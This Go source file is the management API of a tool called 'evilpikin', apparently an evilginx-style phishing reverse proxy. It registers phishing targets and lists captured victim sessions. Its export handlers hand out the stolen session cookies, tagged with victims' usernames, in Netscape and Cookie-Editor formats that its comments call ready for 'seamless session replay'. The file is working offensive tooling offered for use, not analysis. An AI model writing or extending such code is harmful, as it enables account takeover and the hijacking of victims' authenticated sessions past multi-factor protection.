package control

import (
	"encoding/json"
	"net/http"
	"strings"

	"github.com/gorilla/mux"
	"github.com/user/evilpikin/internal/log"
	"github.com/user/evilpikin/internal/storage"
	"github.com/user/evilpikin/internal/telemetry"
)

type ControlAPI struct {
	store          *storage.Store
	inner          *mux.Router
	router         http.Handler
	server         *http.Server
	bindAddr       string
	hub            *telemetry.Hub
	webDir         string
	onTargetUpsert func(*storage.TargetProfile)
	onTargetDelete func(string)
}

// rewriteWrap transparently maps the bare /api/ prefix used by the embedded
// dashboard onto the versioned /api/v1/ routes the handlers implement. It wraps
// the whole router (not a per-route middleware) so the rewritten path is
// re-dispatched through the router instead of being served by the catch-all.
func rewriteWrap(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		if strings.HasPrefix(req.URL.Path, "/api/") && !strings.HasPrefix(req.URL.Path, "/api/v1/") {
			req.URL.Path = "/api/v1" + strings.TrimPrefix(req.URL.Path, "/api")
		}
		next.ServeHTTP(w, req)
	})
}

func NewControlAPI(store *storage.Store) *ControlAPI {
	c := &ControlAPI{
		store:    store,
		bindAddr: "127.0.0.1:8080",
		webDir:   "web",
	}
	r := mux.NewRouter()
	// The web dashboard is served by the SAME process as the engine (it is not a
	// separate binary). The static UI talks to this API via relative /api/ and
	// /ws paths; the bare /api/ prefix is rewritten onto /api/v1/ above.
	r.HandleFunc("/api/v1/health", c.health).Methods("GET")
	r.HandleFunc("/api/v1/targets", c.listTargets).Methods("GET")
	r.HandleFunc("/api/v1/targets", c.upsertTarget).Methods("POST")
	r.HandleFunc("/api/v1/targets/{id}", c.getTarget).Methods("GET")
	r.HandleFunc("/api/v1/targets/{id}", c.deleteTarget).Methods("DELETE")
	r.HandleFunc("/api/v1/sessions", c.listSessions).Methods("GET")
	r.HandleFunc("/api/v1/sessions/{id}", c.getSession).Methods("GET")
	r.HandleFunc("/api/v1/sessions/{id}", c.deleteSession).Methods("DELETE")
	r.HandleFunc("/api/v1/sessions/{id}/export", c.exportSession).Methods("GET")
	r.HandleFunc("/api/v1/sessions/{id}/export.json", c.exportSessionJSON).Methods("GET")
	r.HandleFunc("/api/v1/targets/{id}/export.json", c.exportTargetJSON).Methods("GET")
	if c.hub != nil {
		r.Handle("/ws", c.hub.Handler())
	}
	// Catch-all: serve the embedded monitoring dashboard (index.html at "/").
	// Guarded so it never shadows the specific /api/* or /ws routes that may be
	// registered after this point (e.g. /ws added by SetTelemetryHub).
	notStatic := mux.MatcherFunc(func(req *http.Request, _ *mux.RouteMatch) bool {
		p := req.URL.Path
		return !strings.HasPrefix(p, "/api/") && p != "/ws"
	})
	r.NewRoute().MatcherFunc(notStatic).Handler(http.FileServer(http.Dir(c.webDir)))
	c.inner = r
	c.router = rewriteWrap(r)
	c.server = &http.Server{
		Addr:    c.bindAddr,
		Handler: c.router,
	}
	return c
}

// SetBindAddr overrides the management API listen address.
func (c *ControlAPI) SetBindAddr(addr string) {
	c.bindAddr = addr
}

// SetWebDir points the embedded monitoring dashboard (served at "/") at a
// directory of static assets. The engine and dashboard are ONE process, so the
// operator never launches a separate web service.
func (c *ControlAPI) SetWebDir(dir string) {
	if dir != "" {
		c.webDir = dir
	}
}

func (c *ControlAPI) OnTargetUpsert(fn func(*storage.TargetProfile)) {
	c.onTargetUpsert = fn
}

func (c *ControlAPI) OnTargetDelete(fn func(string)) {
	c.onTargetDelete = fn
}

// SetTelemetryHub attaches the live telemetry hub so the same HTTP listener
// that serves the REST control plane can also stream events over /ws to the
// dashboard / TUI without standing up a separate admin-api process.
func (c *ControlAPI) SetTelemetryHub(h *telemetry.Hub) {
	c.hub = h
	if c.inner != nil {
		c.inner.Handle("/ws", h.Handler())
	}
}

func (c *ControlAPI) Start() error {
	log.Info("control plane: management api bound to %s", c.bindAddr)
	return c.server.ListenAndServe()
}

func (c *ControlAPI) Handler() http.Handler {
	return c.router
}

func (c *ControlAPI) health(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "ok",
	})
}

func (c *ControlAPI) listTargets(w http.ResponseWriter, r *http.Request) {
	targets, err := c.store.ListTargets()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	out := make([]map[string]interface{}, 0, len(targets))
	for _, t := range targets {
		out = append(out, map[string]interface{}{
			"id":         t.ID,
			"name":       t.Name,
			"proxy_host": t.ProxyHost,
			"origin":     t.Origin,
			"enabled":    t.Enabled,
		})
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"count": len(out), "targets": out})
}

func (c *ControlAPI) getTarget(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	t, err := c.store.GetTarget(id)
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{"error": "not found"})
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(t)
}

func (c *ControlAPI) upsertTarget(w http.ResponseWriter, r *http.Request) {
	var t storage.TargetProfile
	if err := json.NewDecoder(r.Body).Decode(&t); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	if t.ID == "" {
		http.Error(w, "id required", http.StatusBadRequest)
		return
	}
	if err := c.store.UpsertTarget(&t); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if c.onTargetUpsert != nil {
		c.onTargetUpsert(&t)
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]interface{}{"status": "ok", "id": t.ID})
}

func (c *ControlAPI) deleteTarget(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if err := c.store.DeleteTarget(id); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if c.onTargetDelete != nil {
		c.onTargetDelete(id)
	}
	w.WriteHeader(http.StatusNoContent)
}

func (c *ControlAPI) listSessions(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	sessions, err := c.store.ListSessions(q.Get("target_id"), q.Get("status"))
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"count": len(sessions), "sessions": sessions})
}

func (c *ControlAPI) getSession(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	s, err := c.store.GetSession(id)
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{"error": "not found"})
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(s)
}

func (c *ControlAPI) deleteSession(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if err := c.store.DeleteSession(id); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

// exportSession streams the captured cookies for a session in Netscape
// cookie-jar format, suitable for direct browser / tooling import.
func (c *ControlAPI) exportSession(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	s, err := c.store.GetSession(id)
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{"error": "not found"})
		return
	}
	data, err := c.store.ExportCookiesNetscape(id)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if s.Username != "" {
		id = id + "_" + sanitizeFile(s.Username)
	}
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Header().Set("Content-Disposition", "attachment; filename=\"evilpikin_"+id+".cookies.txt\"")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(data))
}

// exportSessionJSON streams the captured cookies for a session in the
// evilginx-compatible Cookie-Editor / EditThisCookie JSON format, ready to paste
// into a browser cookie extension for seamless session replay.
func (c *ControlAPI) exportSessionJSON(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	data, err := c.store.ExportCookiesJSON(id)
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{"error": "not found"})
		return
	}
	name := id
	if s, err := c.store.GetSession(id); err == nil && s.Username != "" {
		name = id + "_" + sanitizeFile(s.Username)
	}
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.Header().Set("Content-Disposition", "attachment; filename=\"evilpikin_"+name+".cookies.json\"")
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

// exportTargetJSON streams the union of every cookie captured across all sessions
// of one target in Cookie-Editor JSON format — the per-target dashboard export.
func (c *ControlAPI) exportTargetJSON(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	data, err := c.store.ExportTargetCookiesJSON(id)
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{"error": "not found"})
		return
	}
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.Header().Set("Content-Disposition", "attachment; filename=\"evilpikin_target_"+sanitizeFile(id)+".cookies.json\"")
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

func sanitizeFile(s string) string {
	out := make([]rune, 0, len(s))
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '@' || r == '.' || r == '-' || r == '_' {
			out = append(out, r)
		} else {
			out = append(out, '_')
		}
	}
	return string(out)
}
